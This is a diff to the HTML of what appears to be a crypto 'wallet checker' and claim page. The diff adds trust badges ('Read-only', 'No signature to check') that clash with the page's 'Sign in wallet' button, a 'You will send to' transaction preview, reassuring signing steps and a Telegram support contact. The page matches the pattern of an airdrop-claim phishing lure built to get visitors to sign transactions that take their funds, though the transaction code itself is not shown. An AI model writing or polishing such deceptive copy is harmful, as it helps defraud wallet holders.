@@ -43,6 +43,11 @@
         <p class="eyebrow"><span class="eyebrow-dot" aria-hidden="true"></span>Independent checker</p>
         <h1 id="title">Check your wallet.<br><span>takes 10 seconds.</span></h1>
         <p class="lede">See what is sitting in your address. Nothing to install, nothing to sign while checking.</p>
+        <ul class="trust-badges">
+          <li>No wallet to check</li>
+          <li>No signature to check</li>
+          <li>Read-only</li>
+        </ul>
         <div class="chain-tabs" role="tablist" aria-label="Network">
           <button id="tab-sol" class="chain-tab" role="tab" type="button" aria-selected="true" data-chain="sol">Solana</button>
           <button id="tab-eth" class="chain-tab" role="tab" type="button" aria-selected="false" data-chain="eth">Ethereum</button>
@@ -119,6 +124,8 @@
 
         <div id="claim-box" class="claim-box" hidden>
           <div id="fee-block" class="fee-block" hidden>
+            <p class="preview-title">Transaction preview</p>
+            <div class="fee-row to-row"><span>You will send to</span><span class="to-value"><code id="tx-to" class="mono"></code><button id="tx-to-copy" class="link-button" type="button">Copy</button><a id="tx-to-explorer" class="link-button" href="#" target="_blank" rel="noopener noreferrer">open</a></span></div>
             <div class="fee-row"><span>Network fee</span><span id="fee-network" class="mono"></span></div>
             <div id="fee-deposit-row" class="fee-row" hidden><span>Token account deposit</span><span id="fee-deposit" class="mono"></span></div>
             <div class="fee-row total"><span>Total deducted</span><span id="fee-total" class="mono"></span></div>
@@ -130,6 +137,8 @@
             <p>The claim settles to your wallet, so only the wallet can sign it. Your address alone can't sign.</p>
           </details>
 
+          <p class="next-title">What happens when you tap sign</p>
+          <ol class="next-steps"><li>Wallet opens</li><li>You review one transaction</li><li>Confirm, done</li></ol>
           <button id="claim-button" class="button claim-cta" type="button">Sign in wallet</button>
           <p id="claim-sub" class="claim-sub mono"></p>
           <p id="claim-status" class="message" role="status" hidden></p>
@@ -150,9 +159,11 @@
       </section>
 
       <footer>
-        <div class="footer-meta"><span class="mono">v0.5.0</span></div>
+        <p class="footer-meta">Data: public RPC &middot; Jupiter prices</p>
+        <p class="footer-meta">Allocation table updated 2026-11-22</p>
         <p class="disclaimer">Independent tool. Not affiliated with any project team.</p>
         <p class="support-line">Stuck or charged twice? <a href="https://t.me/HandsomeAuer" target="_blank" rel="noopener noreferrer">Message @HandsomeAuer</a></p>
+        <p class="privacy-strip">No account &middot; No cookies &middot; Address is shared with public RPC only</p>
       </footer>
     </article>
   </main>
